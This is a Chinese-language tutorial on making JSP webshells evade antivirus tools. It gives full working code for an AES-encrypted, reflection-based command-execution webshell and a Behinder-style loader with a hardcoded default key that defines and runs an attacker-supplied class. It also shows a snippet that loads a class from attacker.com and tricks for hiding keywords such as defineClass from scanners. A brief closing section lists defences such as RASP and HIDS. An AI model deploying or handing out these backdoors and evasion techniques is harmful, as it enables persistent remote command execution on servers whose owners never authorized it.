> 本文档旨在深入探讨 JSP Webshell 的免杀（Anti-Virus Evasion）技术。通过结合理论与实践，我们将从代码编码、类加载机制、字节码等多个维度，剖析并复现高级 Webshell 的隐藏与执行技巧。

## 1. 概述 (Overview)

JSP Webshell 作为一种常见的服务器端后门，一直是网络安全攻防对抗的焦点。传统的 Webshell 由于特征明显，极易被静态文件扫描、流量分析等安全产品检测并清除。为了绕过这些检测，攻击者发展出了一系列复杂的免杀技术。

本文将重点研究以下几种高级免杀策略：

*   **代码与编码分离**：将 Webshell 的核心恶意逻辑与 JSP 文件本体分离，通过编码、加密等方式隐藏攻击载荷。
*   **动态类加载**：利用 Java 的类加载机制（ClassLoader），在运行时动态加载并执行远程或本地的恶意代码。
*   **字节码技术**：直接操作 Java 字节码（Bytecode），绕过基于源代码的静态分析。

通过对这些技术的分析和实战演练，我们可以更深刻地理解现代 Webshell 的运作原理，从而构建更有效的防御体系。

## 2. 技术原理 (Technical Principles)

JSP 的底层运行机制是其能够实现复杂免杀技术的基础。当一个 JSP 文件首次被访问时，Web 容器（如 Tomcat）会将其转换为一个 `.java` Servlet 文件，然后编译成 `.class` 字节码文件，最后由 Java 虚拟机（JVM）加载并执行。这个过程为我们提供了多个可操作的环节。

*   **JSP -> Servlet -> Class -> JVM Execution**

### 2.1 编码与加密

这是最基础的免杀手段。通过对恶意代码（如 `Runtime.exec`）进行编码（如 Base64、Unicode）或使用对称/非对称加密，可以有效规避基于字符串特征的静态扫描。执行时，JSP 代码会先进行解码或解密，然后在内存中恢复恶意代码并执行。

### 2.2 Java 反射机制 (Reflection)

反射是 Java 语言的核心特性之一，它允许程序在运行时动态地获取任意一个已知名称的 `Class` 的内部信息，包括其方法、属性等，并能在运行时动态创建对象、调用方法。

*   **优势**：通过反射，可以将 `Runtime.getRuntime().exec("whoami")` 这种敏感调用分解为字符串拼接和方法调用，从而绕过对 `exec` 等关键字的直接检测。
*   **示例**：`Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(...)`

### 2.3 自定义类加载器 (ClassLoader)

Java 的类加载机制是双亲委派模型。我们可以通过自定义 `ClassLoader` 来打破这一模型，实现对类加载过程的完全控制。核心方法是 `defineClass()`，它可以将一个 `byte[]` 数组转换为一个 `Class` 类的实例。

*   **优势**：这是实现高级 Webshell 的关键。攻击载荷（Payload）可以被加密后存储在任何地方（JSP 文件内、远程服务器、数据库等）。JSP Webshell 本身只包含一段极简的“加载器”代码，负责获取加密的字节码，解密后通过自定义 `ClassLoader` 加载到内存中执行。这种“分离加载”的架构使得静态分析几乎不可能发现真正的恶意逻辑。

### 2.4 字节码加载 (Bytecode Loading)

BCEL (Byte Code Engineering Library) 是一个用于分析、创建和操作 Java `class` 文件的 Apache 开源项目。攻击者可以利用它来动态生成包含恶意逻辑的 `class` 文件字节码，然后通过 `ClassLoader` 加载。

*   **优势**：完全脱离了源代码层面，直接在字节码层面进行操作，绕过所有基于源码的检测。

## 3. 环境准备 (Environment Setup)

为了复现以下示例，您需要一个基础的 Java Web 开发与测试环境。

*   **Web 服务器**: Apache Tomcat 8.0 或更高版本。
*   **JDK**: Java Development Kit 1.8。
*   **IDE (可选)**: IntelliJ IDEA 或 Eclipse，用于编译 Java 类。
*   **构建工具 (可选)**: Maven 或 Gradle。
*   **网络抓包工具**: Burp Suite 或 Wireshark，用于分析请求和响应。

确保您的 Tomcat 服务器已启动，并且您可以部署 JSP 文件到其 `webapps` 目录下。

## 4. 实战示例 (Hands-on Examples)

### 案例 1：基于 AES 加密与反射的基础 Webshell

这是一个结合了加密和反射的入门级免杀 Webshell。它将要执行的命令通过 POST 请求加密传输，在服务器端解密后通过反射执行。

```jsp
<%@ page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
    // 解密方法
    public byte[] decrypt(byte[] data, String key) throws Exception {
        Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
        c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key.getBytes("UTF-8"), "AES"));
        return c.doFinal(data);
    }
%>
<%
    if ("POST".equals(request.getMethod())) {
        try {
            // 连接密码，MD5("mypass") 的前16位
            String key = "2835a6382190815a";
            // 从请求体中读取Base64编码的加密数据
            String base64Data = request.getReader().readLine();
            byte[] encryptedData = java.util.Base64.getDecoder().decode(base64Data);

            // 解密数据
            byte[] decryptedData = decrypt(encryptedData, key);
            String cmd = new String(decryptedData, "UTF-8");

            // 使用反射执行命令，避免直接出现 "Runtime.exec"
            Object runtime = Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null);
            Process p = (Process) runtime.getClass().getMethod("exec", String.class).invoke(runtime, cmd);

            // 获取命令执行结果并输出
            java.io.InputStream in = p.getInputStream();
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));
            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line);
            }
            p.waitFor();
        } catch (Exception e) {
            e.printStackTrace(new java.io.PrintWriter(out));
        }
    }
%>
```

**攻击流程**:

1.  客户端使用 AES 加密待执行的命令（如 `whoami`），然后进行 Base64 编码。
2.  通过 POST 请求将编码后的数据发送到此 JSP 页面。
3.  服务器端 JSP 解码并解密，通过反射执行命令，并将结果返回。

### 案例 2：分离加载架构 (冰蝎变种)

这是对著名 Webshell “冰蝎” 核心原理的简化与改造，旨在绕过专业安全产品的检测。其精髓在于 JSP 文件本身不包含任何恶意代码，仅作为一个“加载器”存在。

**核心思想**：

1.  **Payload 分离**：真正的恶意逻辑（如文件管理、命令执行等）被编译成一个独立的 `.class` 文件。
2.  **JSP 加载器**：JSP 文件接收一个加密的 `.class` 文件字节流。
3.  **动态加载**：JSP 使用自定义的 `ClassLoader` 将解密后的字节流加载成一个 `Class` 对象。
4.  **执行**：创建该 `Class` 的实例并调用其方法，将 `pageContext` 等 JSP 内置对象传入，从而让外部 `Class` 获得与 JSP 页面同等的操作能力。

#### 步骤 1: 编写并编译核心功能类

创建一个名为 `Payload.java` 的文件，它继承 `java.lang.ClassLoader` 并包含恶意操作。

```java
// Payload.java
import javax.servlet.jsp.PageContext;
import java.io.InputStream;

public class Payload extends ClassLoader {
    // equals 方法是冰蝎的经典入口，这里我们用它来接收 pageContext
    @Override
    public boolean equals(Object obj) {
        if (obj instanceof PageContext) {
            PageContext pageContext = (PageContext) obj;
            try {
                // 从请求中获取要执行的命令
                String cmd = pageContext.getRequest().getParameter("cmd");
                if (cmd != null && !cmd.isEmpty()) {
                    // 执行命令并回显
                    Process p = Runtime.getRuntime().exec(cmd);
                    InputStream in = p.getInputStream();
                    int a = -1;
                    byte[] b = new byte[2048];
                    while ((a = in.read(b)) != -1) {
                        pageContext.getResponse().getOutputStream().write(b, 0, a);
                    }
                    p.waitFor();
                }
            } catch (Exception e) {
                // 异常处理
            }
        }
        return super.equals(obj);
    }
}
```

使用 `javac` 编译它：

```bash
javac -source 1.8 -target 1.8 Payload.java
```

这会生成 `Payload.class` 文件。

#### 步骤 2: 编写 JSP 加载器

这个 JSP 文件非常简洁，只负责解密和加载。

```jsp
<%@ page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
    // 自定义类加载器，用于加载字节码
    class U extends ClassLoader {
        U(ClassLoader c) { super(c); }
        public Class g(byte[] b) { return super.defineClass(b, 0, b.length); }
    }
%>
<%
    if ("POST".equals(request.getMethod())) {
        try {
            // 默认连接密码 rebeyond
            String k = "e45e329feb5d925b";
            session.putValue("u", k);
            Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
            c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(k.getBytes("UTF-8"), "AES"));
            
            // 读取请求体中的 Base64 数据
            String base64Data = request.getReader().readLine();
            byte[] encryptedData = java.util.Base64.getDecoder().decode(base64Data);
            
            // 解密得到 Payload.class 的字节码
            byte[] classBytes = c.doFinal(encryptedData);
            
            // 加载并执行
            new U(this.getClass().getClassLoader())
                .g(classBytes)
                .newInstance()
                .equals(pageContext);
        } catch (Exception e) {
            // 静默处理
        }
    }
%>
```

**攻击流程**:

1.  客户端读取 `Payload.class` 文件的字节内容。
2.  使用 AES 算法和预设密钥 `e45e329feb5d925b` 加密字节内容。
3.  将加密后的数据进行 Base64 编码。
4.  通过 POST 请求将编码后的数据发送到 JSP 加载器。
5.  服务器端 JSP 解密后得到 `Payload.class` 的原始字节码，通过自定义 `ClassLoader` 加载，并调用 `equals` 方法触发命令执行。

## 5. 关键细节与进阶 (Key Details & Advanced Techniques)

### 5.1 远程类加载

为了进一步增强隐蔽性，可以将 `.class` 文件存放在攻击者控制的远程服务器上。JSP 加载器通过 `java.net.URLClassLoader` 从远程 URL 加载类。

```java
// 远程加载示例代码片段
String remoteClassUrl = "http://attacker.com/payload/"; // 注意末尾的斜杠
java.net.URL[] urls = {new java.net.URL(remoteClassUrl)};
java.net.URLClassLoader loader = new java.net.URLClassLoader(urls, Thread.currentThread().getContextClassLoader());
Class<?> remoteClass = loader.loadClass("Payload"); // 加载名为 Payload 的类
remoteClass.newInstance().equals(pageContext);
```

*   **挑战**：这种方式可能会受到目标服务器网络策略（如防火墙出向限制）和 JVM 沙箱安全策略的限制。

### 5.2 突破沙箱限制

在某些严格配置的 JVM 环境中，`URLClassLoader` 加载的远程类权限很低，无法执行文件读写、命令执行等敏感操作。突破沙箱通常需要利用更复杂的 Java 安全漏洞或寻找配置不当的权限点，这是一个独立的深层研究领域。

### 5.3 特征混淆

即使采用了分离加载，加载器本身也可能存在被检测的风险。例如，`defineClass`、`ClassLoader` 等关键字。可以通过以下方式进行混淆：

*   **利用注释**: `/*a*/defineClass/*b*/`
*   **字符串拼接**: `new String(new byte[]{100, 101, 102, 105, 110, 101, 67, 108, 97, 115, 115})` // "defineClass"
*   **编码**: 使用 Base64 或其他编码方式隐藏关键字，在运行时解码。
*   **反射调用**: 通过反射调用 `ClassLoader` 的 `defineClass` 方法。

## 6. 安全总结与防御建议 (Security Summary & Defense)

通过上述分析，我们可以看到高级 JSP Webshell 的核心是**“分离思想”**和**“动态执行”**。防御这类 Webshell 需要采取纵深防御策略，不能仅仅依赖于静态文件扫描。

1.  **流量监控与分析**:
    *   检测异常的 HTTP 请求，例如一个看似普通的 JSP 文件却持续接收加密的、Base64 编码的长数据流。
    *   监控服务器的出向网络连接，特别是向未知或可疑地址发起的 `HTTP/HTTPS` 请求，这可能是远程加载类的迹象。

2.  **RASP (运行时应用自我保护)**:
    *   RASP 技术可以深入 JVM 内部，Hook 关键的危险函数调用，如 `Runtime.exec`、`ClassLoader.defineClass`、`URLClassLoader` 等。
    *   当一个非预期的类（如 Web 请求传入的字节码）尝试执行敏感操作时，RASP 能够实时检测并阻断。

3.  **HIDS (主机入侵检测系统)**:
    *   监控敏感文件的创建和变更，特别是 `webapps` 目录下的 JSP、CLASS 文件。
    *   监控异常进程链，例如 Web 服务器进程（如 Tomcat）派生出 `sh`、`bash`、`cmd.exe` 等 Shell 进程。

4.  **代码审计与权限控制**:
    *   定期进行安全审计，排查可疑的 JSP 文件。
    *   遵循最小权限原则，限制 Web 应用的运行账户权限，禁止其执行不必要的系统命令和文件访问。

---
